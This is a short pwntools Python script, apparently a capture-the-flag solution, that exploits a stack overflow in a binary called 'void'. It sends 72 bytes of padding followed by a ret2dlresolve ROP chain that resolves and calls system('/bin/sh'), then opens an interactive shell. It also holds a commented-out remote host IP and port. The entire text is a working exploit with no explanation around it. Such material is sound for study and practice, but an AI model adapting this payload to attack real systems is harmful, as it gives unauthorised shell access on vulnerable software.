from pwn import *

void=ELF("./void")
libc=ELF("glibc/libc.so.6")
ld=ELF("glibc/ld-linux-x86-64.so.2")

context.binary=void.path

rop=ROP(context.binary)
dlresolve=Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])
rop.read(0,dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop=rop.chain()

host='83.136.250.158' #change to docker IP
port=39848 #change to docker port

p=process(void.path)

p.sendline(b'A'*72+raw_rop)
p.sendline(dlresolve.payload)


p.interactive()
